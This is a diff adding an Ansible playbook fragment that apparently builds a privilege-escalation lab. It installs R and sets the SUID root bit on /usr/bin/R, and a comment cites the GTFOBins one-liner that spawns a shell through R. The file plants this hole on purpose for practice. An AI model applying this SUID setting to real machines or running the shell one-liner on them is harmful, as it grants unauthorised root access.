@@ -1,0 +1,14 @@
+---
+# GTFOBins: https://gtfobins.github.io/gtfobins/r/#suid
+# Exploit: R --no-save -e 'system("/bin/sh")'
+- name: (privesc/suid_r) Install r-base
+  ansible.builtin.apt:
+    name: r-base
+    state: present
+    update_cache: true
+
+- name: (privesc/suid_r) Set SUID bit on /usr/bin/R
+  ansible.builtin.file:
+    path: /usr/bin/R
+    owner: root
+    mode: "4755"
